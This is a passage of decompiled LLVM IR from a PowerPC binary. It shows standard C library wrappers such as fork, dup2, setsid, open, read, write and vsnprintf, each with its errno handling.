dec_label_pc_1000d7f0:                            ; preds = %dec_label_pc_1000d7d4
  %v0_1000d7f0 = call i32 @__errno_location()
  %v0_1000d7f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d7f4 = inttoptr i32 %v0_1000d7f0 to i32*
  store i32 %v0_1000d7f4, i32* %v2_1000d7f4, align 4
  br label %dec_label_pc_1000d7d4.backedge

dec_label_pc_1000d7d4.backedge:                   ; preds = %dec_label_pc_1000d7f0, %dec_label_pc_1000d7d4
  br label %dec_label_pc_1000d7d4
}

define i32 @access(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d814 = call i32 @__asm_mfcr()
  %v1_1000d818 = and i32 %v0_1000d814, 268435456
  %v3_1000d818 = icmp eq i32 %v1_1000d818, 0
  store i32 %v0_1000d814, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d818, label %dec_label_pc_1000d830, label %dec_label_pc_1000d824

dec_label_pc_1000d824:                            ; preds = %entry
  %v0_1000d824 = call i32 @__errno_location()
  %v0_1000d828 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d828 = inttoptr i32 %v0_1000d824 to i32*
  store i32 %v0_1000d828, i32* %v2_1000d828, align 4
  br label %dec_label_pc_1000d830

dec_label_pc_1000d830:                            ; preds = %entry, %dec_label_pc_1000d824
  %v0_1000d840 = phi i32 [ %v0_1000d814, %entry ], [ -1, %dec_label_pc_1000d824 ]
  ret i32 %v0_1000d840

; uselistorder directives
  uselistorder label %dec_label_pc_1000d830, { 1, 0 }
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d85c = call i32 @__asm_mfcr()
  %v1_1000d860 = and i32 %v0_1000d85c, 268435456
  %v3_1000d860 = icmp eq i32 %v1_1000d860, 0
  store i32 %v0_1000d85c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d860, label %dec_label_pc_1000d878, label %dec_label_pc_1000d86c

dec_label_pc_1000d86c:                            ; preds = %entry
  %v0_1000d86c = call i32 @__errno_location()
  %v0_1000d870 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d870 = inttoptr i32 %v0_1000d86c to i32*
  store i32 %v0_1000d870, i32* %v2_1000d870, align 4
  br label %dec_label_pc_1000d878

dec_label_pc_1000d878:                            ; preds = %entry, %dec_label_pc_1000d86c
  %v0_1000d888 = phi i32 [ %v0_1000d85c, %entry ], [ -1, %dec_label_pc_1000d86c ]
  ret i32 %v0_1000d888

; uselistorder directives
  uselistorder label %dec_label_pc_1000d878, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d8a4 = call i32 @__asm_mfcr()
  %v1_1000d8a8 = and i32 %v0_1000d8a4, 268435456
  %v3_1000d8a8 = icmp eq i32 %v1_1000d8a8, 0
  store i32 %v0_1000d8a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d8a8, label %dec_label_pc_1000d8c0, label %dec_label_pc_1000d8b4

dec_label_pc_1000d8b4:                            ; preds = %entry
  %v0_1000d8b4 = call i32 @__errno_location()
  %v0_1000d8b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d8b8 = inttoptr i32 %v0_1000d8b4 to i32*
  store i32 %v0_1000d8b8, i32* %v2_1000d8b8, align 4
  br label %dec_label_pc_1000d8c0

dec_label_pc_1000d8c0:                            ; preds = %entry, %dec_label_pc_1000d8b4
  %v0_1000d8d0 = phi i32 [ %v0_1000d8a4, %entry ], [ -1, %dec_label_pc_1000d8b4 ]
  ret i32 %v0_1000d8d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000d8c0, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d8ec = call i32 @__asm_mfcr()
  %v1_1000d8f0 = and i32 %v0_1000d8ec, 268435456
  %v3_1000d8f0 = icmp eq i32 %v1_1000d8f0, 0
  store i32 %v0_1000d8ec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d8f0, label %dec_label_pc_1000d908, label %dec_label_pc_1000d8fc

dec_label_pc_1000d8fc:                            ; preds = %entry
  %v0_1000d8fc = call i32 @__errno_location()
  %v0_1000d900 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d900 = inttoptr i32 %v0_1000d8fc to i32*
  store i32 %v0_1000d900, i32* %v2_1000d900, align 4
  br label %dec_label_pc_1000d908

dec_label_pc_1000d908:                            ; preds = %entry, %dec_label_pc_1000d8fc
  %v0_1000d918 = phi i32 [ %v0_1000d8ec, %entry ], [ -1, %dec_label_pc_1000d8fc ]
  ret i32 %v0_1000d918

; uselistorder directives
  uselistorder label %dec_label_pc_1000d908, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d934 = call i32 @__asm_mfcr()
  %v1_1000d938 = and i32 %v0_1000d934, 268435456
  %v3_1000d938 = icmp eq i32 %v1_1000d938, 0
  store i32 %v0_1000d934, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d938, label %dec_label_pc_1000d950, label %dec_label_pc_1000d944

dec_label_pc_1000d944:                            ; preds = %entry
  %v0_1000d944 = call i32 @__errno_location()
  %v0_1000d948 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d948 = inttoptr i32 %v0_1000d944 to i32*
  store i32 %v0_1000d948, i32* %v2_1000d948, align 4
  br label %dec_label_pc_1000d950

dec_label_pc_1000d950:                            ; preds = %entry, %dec_label_pc_1000d944
  %v0_1000d960 = phi i32 [ %v0_1000d934, %entry ], [ -1, %dec_label_pc_1000d944 ]
  ret i32 %v0_1000d960

; uselistorder directives
  uselistorder label %dec_label_pc_1000d950, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000d970 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268491132, i32* @lr, align 4
  %v2_1000d978 = call i32 @getrlimit(i32 7, i32 %v2_1000d970)
  %v1_1000d97c = icmp slt i32 %v2_1000d978, 0
  br i1 %v1_1000d97c, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d988

dec_label_pc_1000d988:                            ; preds = %entry
  %v3_1000d988 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000d98c

dec_label_pc_1000d98c:                            ; preds = %entry, %dec_label_pc_1000d988
  %v0_1000d998 = phi i32 [ 256, %entry ], [ %v3_1000d988, %dec_label_pc_1000d988 ]
  ret i32 %v0_1000d998

; uselistorder directives
  uselistorder label %dec_label_pc_1000d98c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d9b4 = call i32 @__asm_mfcr()
  %v1_1000d9b8 = and i32 %v0_1000d9b4, 268435456
  %v3_1000d9b8 = icmp eq i32 %v1_1000d9b8, 0
  store i32 %v0_1000d9b4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d9b8, label %dec_label_pc_1000d9d0, label %dec_label_pc_1000d9c4

dec_label_pc_1000d9c4:                            ; preds = %entry
  %v0_1000d9c4 = call i32 @__errno_location()
  %v0_1000d9c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d9c8 = inttoptr i32 %v0_1000d9c4 to i32*
  store i32 %v0_1000d9c8, i32* %v2_1000d9c8, align 4
  br label %dec_label_pc_1000d9d0

dec_label_pc_1000d9d0:                            ; preds = %entry, %dec_label_pc_1000d9c4
  %v0_1000d9e0 = phi i32 [ %v0_1000d9b4, %entry ], [ -1, %dec_label_pc_1000d9c4 ]
  ret i32 %v0_1000d9e0

; uselistorder directives
  uselistorder label %dec_label_pc_1000d9d0, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d9fc = call i32 @__asm_mfcr()
  %v1_1000da00 = and i32 %v0_1000d9fc, 268435456
  %v3_1000da00 = icmp eq i32 %v1_1000da00, 0
  store i32 %v0_1000d9fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000da00, label %dec_label_pc_1000da18, label %dec_label_pc_1000da0c

dec_label_pc_1000da0c:                            ; preds = %entry
  %v0_1000da0c = call i32 @__errno_location()
  %v0_1000da10 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000da10 = inttoptr i32 %v0_1000da0c to i32*
  store i32 %v0_1000da10, i32* %v2_1000da10, align 4
  br label %dec_label_pc_1000da18

dec_label_pc_1000da18:                            ; preds = %entry, %dec_label_pc_1000da0c
  %v0_1000da28 = phi i32 [ %v0_1000d9fc, %entry ], [ -1, %dec_label_pc_1000da0c ]
  ret i32 %v0_1000da28

; uselistorder directives
  uselistorder label %dec_label_pc_1000da18, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000da44 = call i32 @__asm_mfcr()
  %v1_1000da48 = and i32 %v0_1000da44, 268435456
  %v3_1000da48 = icmp eq i32 %v1_1000da48, 0
  store i32 %v0_1000da44, i32* %r31.global-to-local, align 4
  br i1 %v3_1000da48, label %dec_label_pc_1000da60, label %dec_label_pc_1000da54

dec_label_pc_1000da54:                            ; preds = %entry
  %v0_1000da54 = call i32 @__errno_location()
  %v0_1000da58 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000da58 = inttoptr i32 %v0_1000da54 to i32*
  store i32 %v0_1000da58, i32* %v2_1000da58, align 4
  br label %dec_label_pc_1000da60

dec_label_pc_1000da60:                            ; preds = %entry, %dec_label_pc_1000da54
  %v0_1000da70 = phi i32 [ %v0_1000da44, %entry ], [ -1, %dec_label_pc_1000da54 ]
  ret i32 %v0_1000da70

; uselistorder directives
  uselistorder label %dec_label_pc_1000da60, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000da8c = call i32 @__asm_mfcr()
  %v1_1000da90 = and i32 %v0_1000da8c, 268435456
  %v3_1000da90 = icmp eq i32 %v1_1000da90, 0
  store i32 %v0_1000da8c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000da90, label %dec_label_pc_1000daa8, label %dec_label_pc_1000da9c

dec_label_pc_1000da9c:                            ; preds = %entry
  %v0_1000da9c = call i32 @__errno_location()
  %v0_1000daa0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000daa0 = inttoptr i32 %v0_1000da9c to i32*
  store i32 %v0_1000daa0, i32* %v2_1000daa0, align 4
  br label %dec_label_pc_1000daa8

dec_label_pc_1000daa8:                            ; preds = %entry, %dec_label_pc_1000da9c
  %v0_1000dab8 = phi i32 [ %v0_1000da8c, %entry ], [ -1, %dec_label_pc_1000da9c ]
  ret i32 %v0_1000dab8

; uselistorder directives
  uselistorder label %dec_label_pc_1000daa8, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000dad0 = and i32 %arg2, 64
  %v3_1000dad0 = icmp eq i32 %v1_1000dad0, 0
  br i1 %v3_1000dad0, label %dec_label_pc_1000dafc, label %dec_label_pc_1000dae0

dec_label_pc_1000dae0:                            ; preds = %entry
  %v2_1000dae8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000dae8, i32* %stack_var_-32, align 4
  %v0_1000daf8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000dafc

dec_label_pc_1000dafc:                            ; preds = %entry, %dec_label_pc_1000dae0
  %v0_1000dafc = phi i32 [ 0, %entry ], [ %v0_1000daf8, %dec_label_pc_1000dae0 ]
  store i32 %v0_1000dafc, i32* @r5, align 4
  %v0_1000db04 = call i32 @__asm_mfcr()
  %v1_1000db08 = and i32 %v0_1000db04, 268435456
  %v3_1000db08 = icmp eq i32 %v1_1000db08, 0
  store i32 %v0_1000db04, i32* %r31.global-to-local, align 4
  br i1 %v3_1000db08, label %dec_label_pc_1000db20, label %dec_label_pc_1000db14

dec_label_pc_1000db14:                            ; preds = %dec_label_pc_1000dafc
  %v0_1000db14 = call i32 @__errno_location()
  %v0_1000db18 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000db18 = inttoptr i32 %v0_1000db14 to i32*
  store i32 %v0_1000db18, i32* %v2_1000db18, align 4
  br label %dec_label_pc_1000db20

dec_label_pc_1000db20:                            ; preds = %dec_label_pc_1000dafc, %dec_label_pc_1000db14
  %v0_1000db30 = phi i32 [ %v0_1000db04, %dec_label_pc_1000dafc ], [ -1, %dec_label_pc_1000db14 ]
  ret i32 %v0_1000db30

; uselistorder directives
  uselistorder label %dec_label_pc_1000db20, { 1, 0 }
  uselistorder label %dec_label_pc_1000dafc, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000db40 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000db40
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000db5c = call i32 @__asm_mfcr()
  %v1_1000db60 = and i32 %v0_1000db5c, 268435456
  %v3_1000db60 = icmp eq i32 %v1_1000db60, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000db5c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000db60, label %dec_label_pc_1000db78, label %dec_label_pc_1000db6c

dec_label_pc_1000db6c:                            ; preds = %entry
  %v0_1000db6c = call i32 @__errno_location()
  %v0_1000db70 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000db70 = inttoptr i32 %v0_1000db6c to i32*
  store i32 %v0_1000db70, i32* %v2_1000db70, align 4
  br label %dec_label_pc_1000db78

dec_label_pc_1000db78:                            ; preds = %entry, %dec_label_pc_1000db6c
  %v0_1000db88 = phi i32 [ %v0_1000db5c, %entry ], [ -1, %dec_label_pc_1000db6c ]
  ret i32 %v0_1000db88

; uselistorder directives
  uselistorder label %dec_label_pc_1000db78, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dba4 = call i32 @__asm_mfcr()
  %v1_1000dba8 = and i32 %v0_1000dba4, 268435456
  %v3_1000dba8 = icmp eq i32 %v1_1000dba8, 0
  store i32 %v0_1000dba4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dba8, label %dec_label_pc_1000dbc0, label %dec_label_pc_1000dbb4

dec_label_pc_1000dbb4:                            ; preds = %entry
  %v0_1000dbb4 = call i32 @__errno_location()
  %v0_1000dbb8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dbb8 = inttoptr i32 %v0_1000dbb4 to i32*
  store i32 %v0_1000dbb8, i32* %v2_1000dbb8, align 4
  br label %dec_label_pc_1000dbc0

dec_label_pc_1000dbc0:                            ; preds = %entry, %dec_label_pc_1000dbb4
  %v0_1000dbd0 = phi i32 [ %v0_1000dba4, %entry ], [ -1, %dec_label_pc_1000dbb4 ]
  ret i32 %v0_1000dbd0

; uselistorder directives
  uselistorder label %dec_label_pc_1000dbc0, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dbec = call i32 @__asm_mfcr()
  %v1_1000dbf0 = and i32 %v0_1000dbec, 268435456
  %v3_1000dbf0 = icmp eq i32 %v1_1000dbf0, 0
  store i32 %v0_1000dbec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dbf0, label %dec_label_pc_1000dc08, label %dec_label_pc_1000dbfc

dec_label_pc_1000dbfc:                            ; preds = %entry
  %v0_1000dbfc = call i32 @__errno_location()
  %v0_1000dc00 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dc00 = inttoptr i32 %v0_1000dbfc to i32*
  store i32 %v0_1000dc00, i32* %v2_1000dc00, align 4
  br label %dec_label_pc_1000dc08

dec_label_pc_1000dc08:                            ; preds = %entry, %dec_label_pc_1000dbfc
  %v0_1000dc18 = phi i32 [ %v0_1000dbec, %entry ], [ -1, %dec_label_pc_1000dbfc ]
  ret i32 %v0_1000dc18

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc08, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dc34 = call i32 @__asm_mfcr()
  %v1_1000dc38 = and i32 %v0_1000dc34, 268435456
  %v3_1000dc38 = icmp eq i32 %v1_1000dc38, 0
  store i32 %v0_1000dc34, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dc38, label %dec_label_pc_1000dc50, label %dec_label_pc_1000dc44

dec_label_pc_1000dc44:                            ; preds = %entry
  %v0_1000dc44 = call i32 @__errno_location()
  %v0_1000dc48 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dc48 = inttoptr i32 %v0_1000dc44 to i32*
  store i32 %v0_1000dc48, i32* %v2_1000dc48, align 4
  br label %dec_label_pc_1000dc50

dec_label_pc_1000dc50:                            ; preds = %entry, %dec_label_pc_1000dc44
  %v0_1000dc60 = phi i32 [ %v0_1000dc34, %entry ], [ -1, %dec_label_pc_1000dc44 ]
  ret i32 %v0_1000dc60

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc50, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dc7c = call i32 @__asm_mfcr()
  %v1_1000dc80 = and i32 %v0_1000dc7c, 268435456
  %v3_1000dc80 = icmp eq i32 %v1_1000dc80, 0
  store i32 %v0_1000dc7c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dc80, label %dec_label_pc_1000dc98, label %dec_label_pc_1000dc8c

dec_label_pc_1000dc8c:                            ; preds = %entry
  %v0_1000dc8c = call i32 @__errno_location()
  %v0_1000dc90 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dc90 = inttoptr i32 %v0_1000dc8c to i32*
  store i32 %v0_1000dc90, i32* %v2_1000dc90, align 4
  br label %dec_label_pc_1000dc98

dec_label_pc_1000dc98:                            ; preds = %entry, %dec_label_pc_1000dc8c
  %v0_1000dca8 = phi i32 [ %v0_1000dc7c, %entry ], [ -1, %dec_label_pc_1000dc8c ]
  ret i32 %v0_1000dca8

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc98, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000dcac = icmp eq i32 %arg2, 0
  br i1 %v3_1000dcac, label %dec_label_pc_1000dcec, label %dec_label_pc_1000dcd4

dec_label_pc_1000dcd4:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000dcec, label %dec_label_pc_1000dcdc

dec_label_pc_1000dcdc:                            ; preds = %dec_label_pc_1000dcd4
  %v0_1000dcdc = call i32 @__errno_location()
  %v2_1000dce4 = inttoptr i32 %v0_1000dcdc to i32*
  store i32 22, i32* %v2_1000dce4, align 4
  %v0_1000dd10.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dd0c

dec_label_pc_1000dcec:                            ; preds = %dec_label_pc_1000dcd4, %entry
  %v0_1000dcf0 = call i32 @__asm_mfcr()
  %v1_1000dcf4 = and i32 %v0_1000dcf0, 268435456
  %v3_1000dcf4 = icmp eq i32 %v1_1000dcf4, 0
  store i32 %v0_1000dcf0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dcf4, label %dec_label_pc_1000dd0c, label %dec_label_pc_1000dd00

dec_label_pc_1000dd00:                            ; preds = %dec_label_pc_1000dcec
  %v0_1000dd00 = call i32 @__errno_location()
  %v0_1000dd04 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dd04 = inttoptr i32 %v0_1000dd00 to i32*
  store i32 %v0_1000dd04, i32* %v2_1000dd04, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dd0c

dec_label_pc_1000dd0c:                            ; preds = %dec_label_pc_1000dcec, %dec_label_pc_1000dcdc, %dec_label_pc_1000dd00
  %v0_1000dd10 = phi i32 [ %v0_1000dcf0, %dec_label_pc_1000dcec ], [ %v0_1000dd10.pre, %dec_label_pc_1000dcdc ], [ -1, %dec_label_pc_1000dd00 ]
  ret i32 %v0_1000dd10

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd0c, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dd3c = call i32 @__asm_mfcr()
  %v1_1000dd40 = and i32 %v0_1000dd3c, 268435456
  %v3_1000dd40 = icmp eq i32 %v1_1000dd40, 0
  store i32 %v0_1000dd3c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dd40, label %dec_label_pc_1000dd58, label %dec_label_pc_1000dd4c

dec_label_pc_1000dd4c:                            ; preds = %entry
  %v0_1000dd4c = call i32 @__errno_location()
  %v0_1000dd50 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dd50 = inttoptr i32 %v0_1000dd4c to i32*
  store i32 %v0_1000dd50, i32* %v2_1000dd50, align 4
  br label %dec_label_pc_1000dd58

dec_label_pc_1000dd58:                            ; preds = %entry, %dec_label_pc_1000dd4c
  %v0_1000dd68 = phi i32 [ %v0_1000dd3c, %entry ], [ -1, %dec_label_pc_1000dd4c ]
  ret i32 %v0_1000dd68

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd58, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000dd70 = call i32 @wait4(i32 0)
  ret i32 %v1_1000dd70
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dd8c = call i32 @__asm_mfcr()
  %v1_1000dd90 = and i32 %v0_1000dd8c, 268435456
  %v3_1000dd90 = icmp eq i32 %v1_1000dd90, 0
  store i32 %v0_1000dd8c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dd90, label %dec_label_pc_1000dda8, label %dec_label_pc_1000dd9c

dec_label_pc_1000dd9c:                            ; preds = %entry
  %v0_1000dd9c = call i32 @__errno_location()
  %v0_1000dda0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dda0 = inttoptr i32 %v0_1000dd9c to i32*
  store i32 %v0_1000dda0, i32* %v2_1000dda0, align 4
  br label %dec_label_pc_1000dda8

dec_label_pc_1000dda8:                            ; preds = %entry, %dec_label_pc_1000dd9c
  %v0_1000ddb8 = phi i32 [ %v0_1000dd8c, %entry ], [ -1, %dec_label_pc_1000dd9c ]
  ret i32 %v0_1000ddb8

; uselistorder directives
  uselistorder label %dec_label_pc_1000dda8, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ddc0 = mul i32 %arg1, 2
  %v3_1000ddc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21648) to i32*), align 4
  %v2_1000ddc8 = add i32 %v3_1000ddc4, %v1_1000ddc0
  %v3_1000ddc8 = inttoptr i32 %v2_1000ddc8 to i16*
  %v4_1000ddc8 = load i16, i16* %v3_1000ddc8, align 2
  %v5_1000ddc8 = zext i16 %v4_1000ddc8 to i32
  %v1_1000ddcc = call i32 @__asm_rlwinm(i32 %v5_1000ddc8, i32 0, i32 26, i32 26)
  ret i32 %v1_1000ddcc
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ddd4 = add i32 %arg1, 128
  %v1_1000ddd8 = mul i32 %arg1, 2
  %v2_1000dddc = icmp ugt i32 %v1_1000ddd4, 383
  %v0_1000dde0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000dddc, i32 %v0_1000dde0)
  %v3_1000dde8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21640) to i32*), align 4
  %v2_1000ddec = add i32 %v1_1000ddd8, %v3_1000dde8
  %v3_1000ddec = inttoptr i32 %v2_1000ddec to i16*
  %v4_1000ddec = load i16, i16* %v3_1000ddec, align 2
  %v5_1000ddec = sext i16 %v4_1000ddec to i32
  ret i32 %v5_1000ddec
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002ac08.584 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_1000dea0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000dea0, i32* @r6, align 4
  store i32 3, i32* %stack_var_-104, align 4
  %v2_1000def4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000def4, i32* %stack_var_-96, align 4
  store i32 268492544, i32* @lr, align 4
  %v0_1000defc = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000defc
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000df30 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000df30, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000df80 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000df80, i32* %stack_var_-96, align 4
  store i32 268492684, i32* @lr, align 4
  %v0_1000df88 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000df88
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000dfa8 = load i32, i32* @r4, align 4
  store i32 %v0_1000dfa8, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000dfc4 = load i32, i32* @r3, align 4
  %v1_1000dfc4 = sub i32 -1, %v0_1000dfc4
  store i32 %v1_1000dfc4, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000dfc4, i32* %r31.global-to-local, align 4
  %v2_1000dfd8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000dfd8, i32* @r3, align 4
  %v0_1000dfdc = load i32, i32* @r5, align 4
  store i32 %v0_1000dfdc, i32* %r29.global-to-local, align 4
  %v0_1000dfe0 = load i32, i32* @r6, align 4
  store i32 %v0_1000dfe0, i32* @r28, align 4
  store i32 268492784, i32* @lr, align 4
  %v0_1000dfec = call i32 @__stdio_init_mutex()
  %v0_1000dff0 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000dff0 = load i32, i32* @r27, align 4
  %v3_1000dff0 = icmp ugt i32 %v0_1000dff0, %v1_1000dff0
  %v0_1000dff4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000dff4, i32* @r4, align 4
  %v0_1000dff8 = load i32, i32* @r28, align 4
  store i32 %v0_1000dff8, i32* @r5, align 4
  %v2_1000dffc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000dffc, i32* @r3, align 4
  br i1 %v3_1000dff0, label %dec_label_pc_1000e008, label %dec_label_pc_1000e00c

dec_label_pc_1000e008:                            ; preds = %entry
  store i32 %v1_1000dff0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e00c

dec_label_pc_1000e00c:                            ; preds = %entry, %dec_label_pc_1000e008
  %v1_1000e00c = phi i32 [ %v0_1000dff0, %entry ], [ %v1_1000dff0, %dec_label_pc_1000e008 ]
  %v0_1000e00c = load i32, i32* %r31.global-to-local, align 4
  store i32 268492844, i32* @lr, align 4
  %v0_1000e028 = call i32 @_vfprintf_internal()
  %v0_1000e02c = load i32, i32* @r30, align 4
  %v3_1000e02c = icmp eq i32 %v0_1000e02c, 0
  br i1 %v3_1000e02c, label %dec_label_pc_1000e054, label %dec_label_pc_1000e034

dec_label_pc_1000e034:                            ; preds = %dec_label_pc_1000e00c
  %v4_1000e040 = icmp eq i32 %v1_1000e00c, 0
  %v1_1000e03c = sext i1 %v4_1000e040 to i32
  %v0_1000e048.v0_1000e00c = add i32 %v0_1000e00c, %v1_1000e03c
  %stack_var_-88.0 = inttoptr i32 %v0_1000e048.v0_1000e00c to i8*
  %v0_1000e050 = load i32, i32* @r26, align 4
  %v1_1000e050 = trunc i32 %v0_1000e050 to i8
  store i8 %v1_1000e050, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000e054

dec_label_pc_1000e054:                            ; preds = %dec_label_pc_1000e00c, %dec_label_pc_1000e034
  ret i32 %v0_1000e028

; uselistorder directives
